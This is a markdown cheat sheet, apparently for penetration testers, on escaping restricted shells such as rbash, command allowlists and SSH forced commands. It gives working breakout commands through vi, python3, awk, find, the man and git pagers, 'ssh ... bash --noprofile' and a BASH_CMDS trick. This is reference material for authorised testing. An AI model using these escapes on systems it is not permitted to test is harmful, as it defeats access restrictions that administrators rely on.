# Restricted shell checks

## Identify the restriction
rbash, command allowlist, SSH forced command and menu need different escapes.

```bash
printf '%s\n' "$0" "$SHELL" "$PATH"
command -v vi vim python3 awk find
```
- rbash blocks commands containing `/` and assignments to `PATH`/`SHELL`: `/bin/ls` and `export PATH=...` are not escapes.

## Escape via an allowed program
```bash
# vi/vim: then  :shell  or  :!/bin/bash
vi
python3 -c 'import pty;pty.spawn("/bin/bash")'
awk 'BEGIN{system("/bin/bash")}'
find . -maxdepth 0 -exec /bin/bash \;
```
- The outer command and its arguments must be allowed by the wrapper.
- Escaped shell is normally the same user: check with `id`.
- SSH remote commands still go through the login shell / forced command.

## Pager shell-escape (man, less, git, …)
Anything that opens `less` as a pager inherits its `!` shell-escape:
```bash
man anything
# at the --More-- prompt:
!/bin/bash
```
```bash
git log
git help <any-subcommand>
# same pager, same escape:
!/bin/bash
```
- `!` is `less`'s own documented command (`man less`): runs the rest of the line through a shell. Works the same whatever program opened the pager.
- A true sshd `ForceCommand` directive overrides this — you never reach the pager for your own command, only the forced one.

## SSH: skip the restricted login shell's startup
```bash
ssh -t <USER>@<IP> bash --noprofile
ssh <USER>@<IP> 'bash -i'
```
- Passing a command to `ssh` skips the interactive-login startup-file chain a bare `ssh user@host` runs; `--noprofile` additionally skips bash's own profile loading. Only works if a real `bash` is still reachable via `PATH` and the restricted shell doesn't block running it by bare name.
- Does **not** bypass a real sshd `ForceCommand` (always runs regardless of what you pass) or a login shell that blocks spawning other shells outright.

## rbash: the `/` filter is shallow
rbash blocks typing a command name containing `/` or reassigning `PATH`/`SHELL` — but only checks the literal word you type, not a value reached through a variable:
```bash
BASH_CMDS[a]=/bin/sh;a
```
- Define the array entry, then just run `a` — `a` itself has no `/`, so the restriction never triggers on it; it gets the mapped target directly.

## vi/vim: explicit shell variable
If the default `$SHELL` is itself restricted, point vi at a real one before escaping:
```vim
:set shell=/bin/bash
:shell
```
- Same idea as the plain `:!/bin/bash` escape above, but survives a restricted-shell login where `$SHELL` is the thing enforcing it, not vi.
